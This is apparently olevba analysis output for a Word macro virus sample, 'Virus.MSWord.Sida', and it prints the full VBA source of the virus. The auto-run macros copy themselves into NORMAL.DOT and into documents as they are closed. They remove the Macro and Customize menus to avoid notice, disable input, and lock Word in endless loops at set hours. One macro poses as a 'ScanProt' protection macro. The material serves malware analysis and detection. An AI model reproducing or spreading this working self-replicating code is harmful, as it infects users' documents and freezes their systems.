olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sida
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sida - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AIDS.bas 
in file: Virus.MSWord.Sida - OLE stream: 'Macros/VBA/AIDS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
End Sub
-------------------------------------------------------------------------------
VBA MACRO AUTOOPEN.bas 
in file: Virus.MSWord.Sida - OLE stream: 'Macros/VBA/AUTOOPEN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim I$
Dim P
Dim n$
Dim K$
Dim T$
Dim s$
Dim Z$
Dim size_
ReDim M__$(0)
Dim count_
WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="toolsmacro", Menu:="&tools", MenuText:="&macro...", ResetAll:=1, Context:=0
On Error Resume Next
I$ = WordBasic.[DefaultDir$](2)
I$ = WordBasic.[DefaultDir$](2)
P = InStr(5, I$, "\")
I$ = WordBasic.[Left$](I$, P - 1)
n$ = WordBasic.[FileName$]()
K$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 5)
T$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 2)
s$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 4)
Z$ = WordBasic.[MacroFileName$]("AIDS")
Rem button = MsgBox(Z$, 36)
    
If Z$ = n$ Then


WordBasic.FileFind SearchPath:=I$, Name:="NORMAL.DOT", SubDir:=1
size_ = WordBasic.CountFoundFiles() - 1
If size_ >= 0 Then
    ReDim M__$(size_)
    For count_ = 0 To size_
        M__$(count_) = WordBasic.[FoundFileName$](count_ + 1)
WordBasic.Organizer Copy:=1, Source:=n$, Destination:=M__$(count_), Name:="AIDS", Tab:=3
WordBasic.Organizer Copy:=1, Source:=n$, Destination:=M__$(count_), Name:="AUTOOPEN", Tab:=3
WordBasic.Organizer Copy:=1, Source:=n$, Destination:=M__$(count_), Name:="AUTOCLOSE", Tab:=3
WordBasic.Organizer Copy:=1, Source:=n$, Destination:=M__$(count_), Name:="AUTOEXIT", Tab:=3
WordBasic.Organizer Copy:=1, Source:=n$, Destination:=M__$(count_), Name:="AUTOEXEC", Tab:=3
        Next
End If

Else
End If

s$ = WordBasic.[MenuText$](1, 1)
If s$ = "&File" Then
WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="ToolsMacro", Menu:="&Tools", MenuText:="&Macro...", Remove:=1, Context:=0
WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="ToolsCustomize", Menu:="&Tools", MenuText:="&Customize...", Remove:=1, Context:=0
Else
WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="ToolsMacro", Menu:="à&¤Ã×èÍ§Á×Í", MenuText:="&ÁÒâ¤Ã...", Remove:=1, Context:=0
WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="ToolsCustomize", Menu:="à&¤Ã×èÍ§Á×Í", MenuText:="¡Ó&Ë¹´àÍ§...", Remove:=1, Context:=0
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO AUTOCLOSE.bas 
in file: Virus.MSWord.Sida - OLE stream: 'Macros/VBA/AUTOCLOSE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim I$
Dim P
Dim n$
Dim K$
Dim T$
Dim s$
Dim Z$
Dim size_
ReDim M__$(0)
WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="toolsmacro", Menu:="&tools", MenuText:="&macro...", ResetAll:=1, Context:=0
I$ = WordBasic.[DefaultDir$](2)
I$ = WordBasic.[DefaultDir$](2)
P = InStr(5, I$, "\")
I$ = WordBasic.[Left$](I$, P - 1)
n$ = WordBasic.[FileName$]()
K$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 5)
T$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 2)
s$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 4)
Z$ = WordBasic.[MacroFileName$]("AIDS")
Rem button = MsgBox(Z$, 36)
If Z$ <> n$ Then

WordBasic.FileFind SearchPath:=I$, Name:="NORMAL.DOT", SubDir:=1

size_ = WordBasic.CountFoundFiles()
If size_ >= 0 Then
    ReDim M__$(size_)
    
        M__$(1) = WordBasic.[FoundFileName$](size_)
WordBasic.FileSaveAs Name:=n$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=1, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0
Rem button = MsgBox(M$(1), 36)

WordBasic.Organizer Copy:=1, Source:=M__$(1), Destination:=n$, Name:="AIDS", Tab:=3
WordBasic.Organizer Copy:=1, Source:=M__$(1), Destination:=n$, Name:="AUTOOPEN", Tab:=3
WordBasic.Organizer Copy:=1, Source:=M__$(1), Destination:=n$, Name:="AUTOCLOSE", Tab:=3
WordBasic.Organizer Copy:=1, Source:=M__$(1), Destination:=n$, Name:="AUTOEXIT", Tab:=3
WordBasic.Organizer Copy:=1, Source:=M__$(1), Destination:=n$, Name:="AUTOEXEC", Tab:=3
      
End If


Else

End If

s$ = WordBasic.[MenuText$](1, 1)
If s$ = "&File" Then
WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="ToolsMacro", Menu:="&Tools", MenuText:="&Macro...", Remove:=1, Context:=0
WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="ToolsCustomize", Menu:="&Tools", MenuText:="&Customize...", Remove:=1, Context:=0
Else
WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="ToolsMacro", Menu:="à&¤Ã×èÍ§Á×Í", MenuText:="&ÁÒâ¤Ã...", Remove:=1, Context:=0
WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="ToolsCustomize", Menu:="à&¤Ã×èÍ§Á×Í", MenuText:="¡Ó&Ë¹´àÍ§...", Remove:=1, Context:=0
End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO AUTOEXIT.bas 
in file: Virus.MSWord.Sida - OLE stream: 'Macros/VBA/AUTOEXIT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to protect and disinfect your Normal (Global) template."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AUTOEXIT.MAIN"
Dim Z$
Dim ii
WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="toolsmacro", Menu:="&tools", MenuText:="&macro...", ResetAll:=1, Context:=0

Z$ = WordBasic.[Time$](WordBasic.Now())
Z$ = WordBasic.[Left$](Z$, 2)
If Z$ = "17" Or Z$ = "05" Or Z$ = "5" Or Z$ = "5:" Then
ii = 0
While ii <> 2
ii = 0
Wend
End If
If Z$ = "20" Then
ii = 0
While ii <> 2
ii = 0
Wend
End If
Rem button = MsgBox(Z$, 36)
End Sub
-------------------------------------------------------------------------------
VBA MACRO AUTOEXEC.bas 
in file: Virus.MSWord.Sida - OLE stream: 'Macros/VBA/AUTOEXEC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Z$
Dim ii
Dim s$
WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="toolsmacro", Menu:="&tools", MenuText:="&macro...", ResetAll:=1, Context:=0
WordBasic.DisableInput 1
On Error Resume Next
Z$ = WordBasic.[Time$](WordBasic.Now())
Z$ = WordBasic.[Left$](Z$, 2)
If Z$ = "17" Or Z$ = "05" Or Z$ = "5" Or Z$ = "5:" Then
ii = 0
While ii <> 2
ii = 0
Wend
End If
If Z$ = "20" Then
ii = 0
While ii <> 2
ii = 0
Wend
End If
s$ = WordBasic.[MenuText$](1, 1)
Rem button = MsgBox(s$, 36)

If s$ = "&File" Then
 WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="ToolsMacro", Menu:="&Tools", MenuText:="&Macro...", Remove:=1, Context:=0
WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="ToolsCustomize", Menu:="&Tools", MenuText:="&Customize...", Remove:=1, Context:=0
Else
 WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="ToolsMacro", Menu:="à&¤Ã×èÍ§Á×Í", MenuText:="&ÁÒâ¤Ã...", Remove:=1, Context:=0
WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="ToolsCustomize", Menu:="à&¤Ã×èÍ§Á×Í", MenuText:="¡Ó&Ë¹´àÍ§...", Remove:=1, Context:=0
End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AUTOOPEN            |Runs when the Word document is opened        |
|AutoExec  |AUTOEXIT            |Runs when the Word document is closed        |
|AutoExec  |AUTOCLOSE           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

